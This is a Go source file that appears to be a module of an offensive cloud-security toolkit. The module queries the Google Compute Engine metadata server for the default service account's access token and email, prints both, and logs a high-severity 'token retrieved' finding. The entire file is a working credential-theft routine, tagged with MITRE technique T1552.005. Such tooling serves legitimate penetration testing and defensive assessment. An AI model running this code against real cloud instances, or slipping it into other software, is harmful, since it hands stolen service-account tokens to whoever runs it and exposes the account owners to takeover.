package compute

import (
	"fmt"
	"io"
	"net/http"

	"github.com/user/nimbus/internal/module"
	"github.com/user/nimbus/internal/output"
)

func init() {
	module.Register(&DumpMetadataToken{})
}

// DumpMetadataToken retrieves access tokens from the GCE metadata server.
type DumpMetadataToken struct{}

func (m *DumpMetadataToken) Info() module.Info {
	return module.Info{
		Name:         "credential.compute.dump-metadata-token",
		Tactic:       module.TacticCredential,
		Service:      "compute",
		Description:  "Retrieve SA access token from the GCE metadata server",
		RequiresAuth: false,
		AttackID:     "T1552.005",
	}
}

func (m *DumpMetadataToken) Run(ctx module.RunContext) error {
	metadataURL := "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

	output.Info("Querying metadata server for SA token...")

	req, err := http.NewRequestWithContext(ctx.Ctx, "GET", metadataURL, nil)
	if err != nil {
		return fmt.Errorf("create request: %w", err)
	}
	req.Header.Set("Metadata-Flavor", "Google")

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		output.Error("Cannot reach metadata server (not running on GCE?): %v", err)
		return nil
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("read response: %w", err)
	}

	if resp.StatusCode != 200 {
		output.Error("Metadata server returned %d: %s", resp.StatusCode, string(body))
		return nil
	}

	output.Success("Token retrieved from metadata server")
	fmt.Printf("\n%s\n\n", string(body))

	// Also fetch SA email.
	emailReq, _ := http.NewRequestWithContext(ctx.Ctx, "GET",
		"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email", nil)
	emailReq.Header.Set("Metadata-Flavor", "Google")
	emailResp, err := http.DefaultClient.Do(emailReq)
	if err == nil {
		defer emailResp.Body.Close()
		emailBody, _ := io.ReadAll(emailResp.Body)
		output.Info("Service account: %s", string(emailBody))
	}

	if ctx.Findings != nil {
		ctx.Findings <- module.Finding{
			Module:      "credential.compute.dump-metadata-token",
			Severity:    module.SevHigh,
			Title:       "Metadata server token retrieved",
			Description: "Successfully dumped SA token from GCE metadata server",
		}
	}

	return nil
}
